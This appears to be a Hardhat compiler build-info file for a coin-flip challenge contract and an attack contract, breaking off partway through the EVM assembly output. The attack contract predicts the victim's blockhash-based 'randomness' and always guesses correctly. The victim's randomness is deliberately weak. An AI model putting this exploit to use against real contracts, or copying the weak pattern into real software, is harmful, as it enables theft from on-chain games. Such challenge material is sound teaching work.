{
	"id": "fdefc3ec93b20ca6ad6640ffff490d2d",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.15",
	"solcLongVersion": "0.8.15+commit.e14f2714",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/CoinflipAttack.sol": {
				"content": "pragma solidity ^0.8.0;\r\n\r\nimport \"./Coinflip.sol\";\r\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\";\r\n\r\ncontract CoinFlipAttack {\r\n\r\n  CoinFlip public victimContract;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor(address _victimContractAddress) public {\r\n    victimContract = CoinFlip(_victimContractAddress);\r\n  }\r\n\r\n  function flip() public returns (bool) {\r\n      uint256 blockValue = uint256(blockhash(block.number - 1));\r\n      uint256 coinFlip = uint256(blockValue/FACTOR);\r\n      bool side = coinFlip == 1 ? true : false;\r\n      victimContract.flip(side);\r\n    \r\n  }\r\n\r\n}"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\n\npragma solidity ^0.8.0;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n"
			},
			"contracts/Coinflip.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\";\r\n\r\ncontract CoinFlip {\r\n\r\n  using SafeMath for uint256;\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue.div(FACTOR);\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Coinflip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/Coinflip.sol\":174:902  contract CoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Coinflip.sol\":303:380  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contracts/Coinflip.sol\":286:380  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contracts/Coinflip.sol\":387:440  constructor() public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/Coinflip.sol\":433:434  0 */\n  0x00\n    /* \"contracts/Coinflip.sol\":415:430  consecutiveWins */\n  dup1\n    /* \"contracts/Coinflip.sol\":415:434  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contracts/Coinflip.sol\":174:902  contract CoinFlip {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Coinflip.sol\":174:902  contract CoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Coinflip.sol\":446:899  function flip(bool _guess) public returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Coinflip.sol\":230:260  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Coinflip.sol\":446:899  function flip(bool _guess) public returns (bool) {... */\n    tag_8:\n        /* \"contracts/Coinflip.sol\":489:493  bool */\n      0x00\n        /* \"contracts/Coinflip.sol\":502:520  uint256 blockValue */\n      dup1\n        /* \"contracts/Coinflip.sol\":541:560  block.number.sub(1) */\n      tag_16\n        /* \"contracts/Coinflip.sol\":558:559  1 */\n      0x01\n        /* \"contracts/Coinflip.sol\":541:553  block.number */\n      number\n        /* \"contracts/Coinflip.sol\":541:557  block.number.sub */\n      tag_17\n      swap1\n        /* \"contracts/Coinflip.sol\":541:560  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_16:\n        /* \"contracts/Coinflip.sol\":531:561  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"contracts/Coinflip.sol\":523:562  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"contracts/Coinflip.sol\":502:562  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"contracts/Coinflip.sol\":587:597  blockValue */\n      dup1\n        /* \"contracts/Coinflip.sol\":575:583  lastHash */\n      sload(0x01)\n        /* \"contracts/Coinflip.sol\":575:597  lastHash == blockValue */\n      sub\n        /* \"contracts/Coinflip.sol\":571:624  if (lastHash == blockValue) {... */\n      tag_18\n      jumpi\n        /* \"contracts/Coinflip.sol\":608:616  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contracts/Coinflip.sol\":571:624  if (lastHash == blockValue) {... */\n    tag_18:\n        /* \"contracts/Coinflip.sol\":643:653  blockValue */\n      dup1\n        /* \"contracts/Coinflip.sol\":632:640  lastHash */\n      0x01\n        /* \"contracts/Coinflip.sol\":632:653  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Coinflip.sol\":660:676  uint256 coinFlip */\n      0x00\n        /* \"contracts/Coinflip.sol\":679:701  blockValue.div(FACTOR) */\n      tag_19\n        /* \"contracts/Coinflip.sol\":694:700  FACTOR */\n      sload(0x02)\n        /* \"contracts/Coinflip.sol\":679:689  blockValue */\n      dup4\n        /* \"contracts/Coinflip.sol\":679:693  blockValue.div */\n      tag_20\n      swap1\n        /* \"contracts/Coinflip.sol\":679:701  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_19:\n        /* \"contracts/Coinflip.sol\":660:701  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"contracts/Coinflip.sol\":708:717  bool side */\n      0x00\n        /* \"contracts/Coinflip.sol\":732:733  1 */\n      0x01\n        /* \"contracts/Coinflip.sol\":720:728  coinFlip */\n      dup3\n        /* \"contracts/Coinflip.sol\":720:733  coinFlip == 1 */\n      eq\n        /* \"contracts/Coinflip.sol\":720:748  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"contracts/Coinflip.sol\":743:748  false */\n      0x00\n        /* \"contracts/Coinflip.sol\":720:748  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"contracts/Coinflip.sol\":736:740  true */\n      0x01\n        /* \"contracts/Coinflip.sol\":720:748  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"contracts/Coinflip.sol\":708:748  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contracts/Coinflip.sol\":769:775  _guess */\n      dup5\n        /* \"contracts/Coinflip.sol\":761:775  side == _guess */\n      iszero\n      iszero\n        /* \"contracts/Coinflip.sol\":761:765  side */\n      dup2\n        /* \"contracts/Coinflip.sol\":761:775  side == _guess */\n      iszero\n      iszero\n      sub\n        /* \"contracts/Coinflip.sol\":757:894  if (side == _guess) {... */\n      tag_23\n      jumpi\n        /* \"contracts/Coinflip.sol\":786:801  consecutiveWins */\n      0x00\n      dup1\n        /* \"contracts/Coinflip.sol\":786:803  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/Coinflip.sol\":819:823  true */\n      0x01\n        /* \"contracts/Coinflip.sol\":812:823  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"contracts/Coinflip.sol\":757:894  if (side == _guess) {... */\n    tag_23:\n        /* \"contracts/Coinflip.sol\":864:865  0 */\n      0x00\n        /* \"contracts/Coinflip.sol\":846:861  consecutiveWins */\n      dup1\n        /* \"contracts/Coinflip.sol\":846:865  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Coinflip.sol\":881:886  false */\n      0x00\n        /* \"contracts/Coinflip.sol\":874:886  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Coinflip.sol\":446:899  function flip(bool _guess) public returns (bool) {... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Coinflip.sol\":230:260  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3122:3218  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_17:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3180:3187  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3210:3211  b */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3206:3207  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3206:3211  a - b */\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3199:3211  return a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3122:3218  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3850:3946  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_20:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3908:3915  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3938:3939  b */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3934:3935  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3934:3939  a / b */\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3927:3939  return a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol\":3850:3946  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_34:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:424   */\n    tag_36:\n        /* \"#utility.yul\":368:375   */\n      0x00\n        /* \"#utility.yul\":411:416   */\n      dup2\n        /* \"#utility.yul\":404:417   */\n      iszero\n        /* \"#utility.yul\":397:418   */\n      iszero\n        /* \"#utility.yul\":386:418   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":430:546   */\n    tag_37:\n        /* \"#utility.yul\":500:521   */\n      tag_50\n        /* \"#utility.yul\":515:520   */\n      dup2\n        /* \"#utility.yul\":500:521   */\n      tag_36\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":493:498   */\n      dup2\n        /* \"#utility.yul\":490:522   */\n      eq\n        /* \"#utility.yul\":480:540   */\n      tag_51\n      jumpi\n        /* \"#utility.yul\":536:537   */\n      0x00\n        /* \"#utility.yul\":533:534   */\n      dup1\n        /* \"#utility.yul\":526:538   */\n      revert\n        /* \"#utility.yul\":480:540   */\n    tag_51:\n        /* \"#utility.yul\":430:546   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":552:685   */\n    tag_38:\n        /* \"#utility.yul\":595:600   */\n      0x00\n        /* \"#utility.yul\":633:639   */\n      dup2\n        /* \"#utility.yul\":620:640   */\n      calldataload\n        /* \"#utility.yul\":611:640   */\n      swap1\n      pop\n        /* \"#utility.yul\":649:679   */\n      tag_53\n        /* \"#utility.yul\":673:678   */\n      dup2\n        /* \"#utility.yul\":649:679   */\n      tag_37\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":552:685   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":691:1014   */\n    tag_7:\n        /* \"#utility.yul\":747:753   */\n      0x00\n        /* \"#utility.yul\":796:798   */\n      0x20\n        /* \"#utility.yul\":784:793   */\n      dup3\n        /* \"#utility.yul\":775:782   */\n      dup5\n        /* \"#utility.yul\":771:794   */\n      sub\n        /* \"#utility.yul\":767:799   */\n      slt\n        /* \"#utility.yul\":764:883   */\n      iszero\n      tag_55\n      jumpi\n        /* \"#utility.yul\":802:881   */\n      tag_56\n      tag_34\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":764:883   */\n    tag_55:\n        /* \"#utility.yul\":922:923   */\n      0x00\n        /* \"#utility.yul\":947:997   */\n      tag_57\n        /* \"#utility.yul\":989:996   */\n      dup5\n        /* \"#utility.yul\":980:986   */\n      dup3\n        /* \"#utility.yul\":969:978   */\n      dup6\n        /* \"#utility.yul\":965:987   */\n      add\n        /* \"#utility.yul\":947:997   */\n      tag_38\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":937:997   */\n      swap2\n      pop\n        /* \"#utility.yul\":893:1007   */\n      pop\n        /* \"#utility.yul\":691:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1129   */\n    tag_39:\n        /* \"#utility.yul\":1101:1122   */\n      tag_59\n        /* \"#utility.yul\":1116:1121   */\n      dup2\n        /* \"#utility.yul\":1101:1122   */\n      tag_36\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1096:1099   */\n      dup3\n        /* \"#utility.yul\":1089:1123   */\n      mstore\n        /* \"#utility.yul\":1020:1129   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1135:1345   */\n    tag_10:\n        /* \"#utility.yul\":1222:1226   */\n      0x00\n        /* \"#utility.yul\":1260:1262   */\n      0x20\n        /* \"#utility.yul\":1249:1258   */\n      dup3\n        /* \"#utility.yul\":1245:1263   */\n      add\n        /* \"#utility.yul\":1237:1263   */\n      swap1\n      pop\n        /* \"#utility.yul\":1273:1338   */\n      tag_61\n        /* \"#utility.yul\":1335:1336   */\n      0x00\n        /* \"#utility.yul\":1324:1333   */\n      dup4\n        /* \"#utility.yul\":1320:1337   */\n      add\n        /* \"#utility.yul\":1311:1317   */\n      dup5\n        /* \"#utility.yul\":1273:1338   */\n      tag_39\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1135:1345   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1428   */\n    tag_40:\n        /* \"#utility.yul\":1388:1395   */\n      0x00\n        /* \"#utility.yul\":1417:1422   */\n      dup2\n        /* \"#utility.yul\":1406:1422   */\n      swap1\n      pop\n        /* \"#utility.yul\":1351:1428   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1434:1552   */\n    tag_41:\n        /* \"#utility.yul\":1521:1545   */\n      tag_64\n        /* \"#utility.yul\":1539:1544   */\n      dup2\n        /* \"#utility.yul\":1521:1545   */\n      tag_40\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1516:1519   */\n      dup3\n        /* \"#utility.yul\":1509:1546   */\n      mstore\n        /* \"#utility.yul\":1434:1552   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1780   */\n    tag_14:\n        /* \"#utility.yul\":1651:1655   */\n      0x00\n        /* \"#utility.yul\":1689:1691   */\n      0x20\n        /* \"#utility.yul\":1678:1687   */\n      dup3\n        /* \"#utility.yul\":1674:1692   */\n      add\n        /* \"#utility.yul\":1666:1692   */\n      swap1\n      pop\n        /* \"#utility.yul\":1702:1773   */\n      tag_66\n        /* \"#utility.yul\":1770:1771   */\n      0x00\n        /* \"#utility.yul\":1759:1768   */\n      dup4\n        /* \"#utility.yul\":1755:1772   */\n      add\n        /* \"#utility.yul\":1746:1752   */\n      dup5\n        /* \"#utility.yul\":1702:1773   */\n      tag_41\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1558:1780   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1786:1966   */\n    tag_42:\n        /* \"#utility.yul\":1834:1911   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1831:1832   */\n      0x00\n        /* \"#utility.yul\":1824:1912   */\n      mstore\n        /* \"#utility.yul\":1931:1935   */\n      0x11\n        /* \"#utility.yul\":1928:1929   */\n      0x04\n        /* \"#utility.yul\":1921:1936   */\n      mstore\n        /* \"#utility.yul\":1955:1959   */\n      0x24\n        /* \"#utility.yul\":1952:1953   */\n      0x00\n        /* \"#utility.yul\":1945:1960   */\n      revert\n        /* \"#utility.yul\":1972:2205   */\n    tag_25:\n        /* \"#utility.yul\":2011:2014   */\n      0x00\n        /* \"#utility.yul\":2034:2058   */\n      tag_69\n        /* \"#utility.yul\":2052:2057   */\n      dup3\n        /* \"#utility.yul\":2034:2058   */\n      tag_40\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2025:2058   */\n      swap2\n      pop\n        /* \"#utility.yul\":2080:2146   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2073:2078   */\n      dup3\n        /* \"#utility.yul\":2070:2147   */\n      sub\n        /* \"#utility.yul\":2067:2170   */\n      tag_70\n      jumpi\n        /* \"#utility.yul\":2150:2168   */\n      tag_71\n      tag_42\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2067:2170   */\n    tag_70:\n        /* \"#utility.yul\":2197:2198   */\n      0x01\n        /* \"#utility.yul\":2190:2195   */\n      dup3\n        /* \"#utility.yul\":2186:2199   */\n      add\n        /* \"#utility.yul\":2179:2199   */\n      swap1\n      pop\n        /* \"#utility.yul\":1972:2205   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2211:2402   */\n    tag_29:\n        /* \"#utility.yul\":2251:2255   */\n      0x00\n        /* \"#utility.yul\":2271:2291   */\n      tag_73\n        /* \"#utility.yul\":2289:2290   */\n      dup3\n        /* \"#utility.yul\":2271:2291   */\n      tag_40\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2266:2291   */\n      swap2\n      pop\n        /* \"#utility.yul\":2305:2325   */\n      tag_74\n        /* \"#utility.yul\":2323:2324   */\n      dup4\n        /* \"#utility.yul\":2305:2325   */\n      tag_40\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2300:2325   */\n      swap3\n      pop\n        /* \"#utility.yul\":2344:2345   */\n      dup3\n        /* \"#utility.yul\":2341:2342   */\n      dup3\n        /* \"#utility.yul\":2338:2346   */\n      lt\n        /* \"#utility.yul\":2335:2369   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2349:2367   */\n      tag_76\n      tag_42\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2335:2369   */\n    tag_75:\n        /* \"#utility.yul\":2394:2395   */\n      dup3\n        /* \"#utility.yul\":2391:2392   */\n      dup3\n        /* \"#utility.yul\":2387:2396   */\n      sub\n        /* \"#utility.yul\":2379:2396   */\n      swap1\n      pop\n        /* \"#utility.yul\":2211:2402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2408:2588   */\n    tag_43:\n        /* \"#utility.yul\":2456:2533   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2453:2454   */\n      0x00\n        /* \"#utility.yul\":2446:2534   */\n      mstore\n        /* \"#utility.yul\":2553:2557   */\n      0x12\n        /* \"#utility.yul\":2550:2551   */\n      0x04\n        /* \"#utility.yul\":2543:2558   */\n      mstore\n        /* \"#utility.yul\":2577:2581   */\n      0x24\n        /* \"#utility.yul\":2574:2575   */\n      0x00\n        /* \"#utility.yul\":2567:2582   */\n      revert\n        /* \"#utility.yul\":2594:2779   */\n    tag_32:\n        /* \"#utility.yul\":2634:2635   */\n      0x00\n        /* \"#utility.yul\":2651:2671   */\n      tag_79\n        /* \"#utility.yul\":2669:2670   */\n      dup3\n        /* \"#utility.yul\":2651:2671   */\n      tag_40\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2646:2671   */\n      swap2\n      pop\n        /* \"#utility.yul\":2685:2705   */\n      tag_80\n        /* \"#utility.yul\":2703:2704   */\n      dup4\n        /* \"#utility.yul\":2685:2705   */\n      tag_40\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2680:2705   */\n      swap3\n      pop\n        /* \"#utility.yul\":2724:2725   */\n      dup3\n        /* \"#utility.yul\":2714:2749   */\n      tag_81\n      jumpi\n        /* \"#utility.yul\":2729:2747   */\n      tag_82\n      tag_43\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2714:2749   */\n    tag_81:\n        /* \"#utility.yul\":2771:2772   */\n      dup3\n        /* \"#utility.yul\":2768:2769   